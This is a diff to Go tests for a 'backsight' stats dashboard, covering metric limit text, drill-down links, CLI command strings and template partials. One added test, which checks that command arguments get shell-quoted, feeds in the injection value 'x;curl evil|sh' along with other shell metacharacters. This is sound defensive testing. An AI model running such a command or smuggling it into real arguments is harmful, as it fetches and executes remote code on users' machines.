@@ -28,13 +28,14 @@ func f64(x float64) *float64 { return &x }
 
 func TestLimitsText(t *testing.T) {
 	for id, want := range map[string]string{
-		"recall.hit_rate":     "Watch when it stays under its usual level two weeks running, or when even the upper bound is under 10 %.",
-		"verdict.wrong_rate":  "Watch when the lower bound is over 5 %, attention over 15 %.",
-		"recall.latency":      "Watch over 2.0 s, attention over 2.5 s.",
-		"bank.size":           "No limit: shown for information.",
-		"hooks.failures":      "Judged at once, not over two weeks.",
-		"context.per_session": "Watch when the high value is over 1.5 × the session budget.",
-		"declare.coverage":    "Watch when even the upper bound is under 80 %.",
+		"recall.hit_rate":         "Watch when it stays under its usual level two weeks running, or when even the upper bound is under 10 %.",
+		"verdict.wrong_rate":      "Watch when the lower bound is over 5 %, attention over 15 %.",
+		"recall.latency":          "Watch over 2.0 s, attention over 2.5 s.",
+		"bank.size":               "No limit: shown for information.",
+		"hooks.failures":          "Judged at once, not over two weeks.",
+		"context.per_session":     "Watch when the high value is over 1.5 × the session budget.",
+		"declare.coverage":        "Watch when even the upper bound is under 80 %.",
+		"server.extraction_delay": "Watch over 30 min.",
 	} {
 		if got := limitsText(def(t, id), en); got != want {
 			t.Errorf("%s: %q, want %q", id, got, want)
@@ -97,6 +98,11 @@ func TestDrillHref(t *testing.T) {
 		{"backsight stats sessions --text", ""},
 		{"backsight stats sessions --machines all", ""},
 		{"backsight stats sessions --has", ""},
+		{"backsight stats overview", "/"},
+		{"backsight stats sessions --has 'memory", ""},
+		{"backsight stats quality --project --dev", ""},
+		{"backsight stats sessions .", ""},
+		{"backsight stats sessions ..", ""},
 		{"backsight stats nothing", ""},
 		{"", ""},
 	} {
@@ -116,6 +122,11 @@ func TestDrillHref(t *testing.T) {
 		{views.Params{Project: "p1"}, "backsight stats quality --project other", "/quality?project=other"},
 		{views.Params{DevSet: true}, "backsight stats days", "/days?dev=0"},
 		{views.Params{Project: "p1", Limit: 2, Offset: 4}, "backsight memory stale", ""},
+		{views.Params{Project: "p1"}, "backsight stats overview", "/?project=p1"},
+		// The window is one group: a drill that sets part of it keeps the page's out.
+		{views.Params{Since: "2026-10-01", Until: "2026-10-08", Project: "p1"}, "backsight stats sessions --days 7", "/sessions?days=7&project=p1"},
+		{views.Params{Days: 30, DaysSet: true}, "backsight stats sessions --since 2026-10-01", "/sessions?since=2026-10-01"},
+		{views.Params{Days: 30, DaysSet: true, Since: "2026-10-01"}, "backsight stats sessions --until 2026-10-08", "/sessions?until=2026-10-08"},
 	} {
 		if got := drillHref(c.drill, c.p); got != c.want {
 			t.Errorf("drillHref(%q, %+v): %q, want %q", c.drill, c.p, got, c.want)
@@ -141,6 +152,42 @@ func TestCLIFor(t *testing.T) {
 		if got := cliFor(c.view, c.id, c.p); got != c.want {
 			t.Errorf("cliFor: %q, want %q", got, c.want)
 		}
+	}
+}
+
+func TestCLIForQuotesWhatAShellReads(t *testing.T) {
+	for in, want := range map[string]string{
+		"x;curl evil|sh":             `'x;curl evil|sh'`,
+		"a&b":                        `'a&b'`,
+		"a|b":                        `'a|b'`,
+		"a\nb":                       "'a\nb'",
+		"a$b":                        `'a$b'`,
+		"a`b`":                       "'a`b`'",
+		`a"b`:                        `'a"b'`,
+		`a\b`:                        `'a\b'`,
+		"a\tb":                       "'a\tb'",
+		"it's":                       `'it'\''s'`,
+		"a>b":                        `'a>b'`,
+		"(x)":                        `'(x)'`,
+		"*":                          `'*'`,
+		"#x":                         `'#x'`,
+		"~":                          `'~'`,
+		"!x":                         `'!x'`,
+		"my-proj_1.v2/a:b=c@d%e+f,g": "my-proj_1.v2/a:b=c@d%e+f,g",
+	} {
+		got := cliFor("overview", "", views.Params{Project: in, Limit: 50})
+		if want2 := "backsight stats overview --project " + want; got != want2 {
+			t.Errorf("project %q: %q, want %q", in, got, want2)
+		}
+	}
+	if got := quoteArg(""); got != `''` {
+		t.Errorf("an empty word: %q", got)
+	}
+	// Every free value goes through the same quoting.
+	got := cliFor("sessions", "a b", views.Params{Path: "p;q", Has: "h h", Sort: "s s", State: "t t", Since: "x y", Until: "u u", TZ: "z z", Limit: 50})
+	want := "backsight stats sessions 'a b' --since 'x y' --until 'u u' --tz 'z z' --path 'p;q' --has 'h h' --sort 's s' --state 't t'"
+	if got != want {
+		t.Errorf("free values: %q, want %q", got, want)
 	}
 }
 
@@ -171,7 +218,7 @@ func TestStatusWords(t *testing.T) {
 func TestHooksFailuresDefinitionIsPlain(t *testing.T) {
 	v := MetricView{ID: "hooks.failures", Def: def(t, "hooks.failures"), Found: true}
 	h := headOf(v, "backsight stats pipeline", en, "", views.Params{})
-	if h.Info.What != hooksFailuresWhat {
+	if h.Info.What != "Steps that crashed, by how they failed (crashed, stopped on an error, ran too long, was stopped, exited with an error, gave an unreadable answer, input too large, could not start). In the last 24 hours, a crash, a stop on an error, an error exit or a failed start, or any kind three times, is watched; ten or more is bad." {
 		t.Errorf("What = %q", h.Info.What)
 	}
 	if strings.Contains(strings.ToLower(h.Info.What), "hook failure") || strings.Contains(strings.ToLower(h.Info.Name), "hook failure") {
@@ -237,7 +284,7 @@ func TestNoDataSentences(t *testing.T) {
 		t.Errorf("no_events at 90 days: %+v", n)
 	}
 	if n = get(nd(metrics.ReasonFeedbackOff), f); n.Text != "Memory feedback is off (" || n.Code != "feedback.enabled" ||
-		n.Tail != "). Quality numbers need it. Found, Cost and Flowing still work." {
+		n.Close != ")." || n.Tail != "Quality numbers need it. Found, Cost and Flowing still work." {
 		t.Errorf("feedback_off: %+v", n)
 	}
 	for reason, want := range map[string]string{
@@ -431,8 +478,88 @@ func TestFigAndNoDataPartials(t *testing.T) {
 	if c := n.first("div.empty code"); c == nil || codeText(c) != "feedback.enabled" || !strings.HasPrefix(n.first("div.empty span").text(), "Memory feedback is off (") {
 		t.Errorf("feedback_off: %v", c)
 	}
+	n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
+		V   MetricView
+		F   Frame
+		L   format.Locale
+		Loc *time.Location
+	}{MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusOK, Value: f64(0.5)}}, fr, en, time.UTC})
+	if n.first(".empty") != nil {
+		t.Error("the nodata partial draws a box for a metric with a number")
+	}
+	for _, c := range []struct {
+		m     metrics.Metric
+		class string
+	}{
+		{metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonServerDown}, "st-watch"},
+		{metrics.Metric{Status: metrics.StatusTooFew, Num: i64(1), Den: i64(2)}, "st-few"},
+	} {
+		n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
+			V   MetricView
+			F   Frame
+			L   format.Locale
+			Loc *time.Location
+		}{MetricView{ID: d.ID, Def: d, Found: true, M: c.m}, fr, en, time.UTC})
+		if n.first(".empty."+c.class) == nil {
+			t.Errorf("%+v: no .empty.%s", c.m, c.class)
+		}
+	}
+	// A 24 h window offers the longer ones.
+	fr24 := Frame{Window: "last 24 h", Windows: windowsFor("/", nil)}
+	if got, _ := noDataOf(MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonNoEvents}}, fr24, en, time.UTC); len(got.Links) != 3 || got.Links[0].Label != "7 d" {
+		t.Errorf("24 h window: %+v", got)
+	}
+	// The tail is muted, apart from the sentence.
+	if m := n.first(".empty .muted"); m != nil {
+		t.Errorf("a muted tail where there is none: %v", m)
+	}
+	n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
+		V   MetricView
+		F   Frame
+		L   format.Locale
+		Loc *time.Location
+	}{MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonFeedbackOff}}, fr, en, time.UTC})
+	if m := n.first(".empty .xs.muted"); m == nil || m.text() != "Quality numbers need it. Found, Cost and Flowing still work." {
+		t.Errorf("feedback tail: %v", m)
+	}
+	if n.first(".empty .st") != nil {
+		t.Error("a status pill in the no-data box")
+	}
 	n = widgetProbe(t, `{{template "cmd" "backsight doctor"}}`, nil)
 	if c := n.first("div.cmd code"); c == nil || codeText(c) != "backsight doctor" || !n.first("div.cmd button.copy").has("hidden") {
 		t.Errorf("cmd: %v", c)
+	}
+}
+
+func TestInfoParasAndServerChipTitle(t *testing.T) {
+	n := widgetProbe(t, `{{$h := withinfo (fixed "x" "Q?" "server" "cmd") "About X" "X: Q?" "x.term" "One." "Two."}}{{template "card-open" $h}}{{template "card-close" $h}}`, nil)
+	ps := n.find(".pop p")
+	if len(ps) != 2 || ps[0].text() != "One." || ps[1].text() != "Two." {
+		t.Errorf("paragraphs: %v", ps)
+	}
+	if n.first(".pop dl") != nil {
+		t.Error("a fixed widget has definition rows")
+	}
+	if c := n.first(".card-head .chip"); c == nil || c.attr("title") != "From the memory server: all PCs" || c.first(".i-server") == nil {
+		t.Errorf("server chip: %v", c)
+	}
+	if a := n.first(".pop a"); a != nil {
+		t.Errorf("a definition link without an Href: %v", a)
+	}
+}
+
+func TestHiddenStaysHidden(t *testing.T) {
+	// .copy sets display, which beats the browser's [hidden]: the stylesheet
+	// must say it back, or a copy button with scripts off is visible and dead.
+	css, err := assetFS.ReadFile("assets/dashboard.css")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(css), "[hidden] { display: none !important; }") {
+		t.Error("dashboard.css has no [hidden] rule that beats .copy")
+	}
+	n := widgetProbe(t, `{{template "cmd" "x"}}`, nil)
+	if b := n.first("button.copy"); b == nil || !b.has("hidden") {
+		t.Errorf("copy button: %v", b)
 	}
 }
